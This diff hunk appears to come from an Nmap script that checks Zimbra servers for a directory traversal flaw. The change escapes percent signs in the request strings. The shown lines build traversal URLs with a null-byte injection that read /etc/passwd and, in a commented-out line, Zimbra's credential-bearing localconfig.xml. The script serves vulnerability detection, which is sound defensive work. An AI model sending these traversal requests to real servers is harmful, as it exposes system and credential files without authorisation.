@@ -88,9 +88,8 @@ This issue was patched in Zimbra 7.2.6.
   local file_long = "../../../../../../../../../etc/passwd"
   --local file_long = "../../../../../../../../../opt/zimbra/conf/localconfig.xml"
 
-  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%00"
-  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%00"
-
+  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%%00"
+  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%%00"
   stdnse.debug1("Trying to detect if the server is vulnerable")
   stdnse.debug1("GET " .. uri .. escape(url_short))
   stdnse.debug1("GET " .. uri .. escape(url_long))
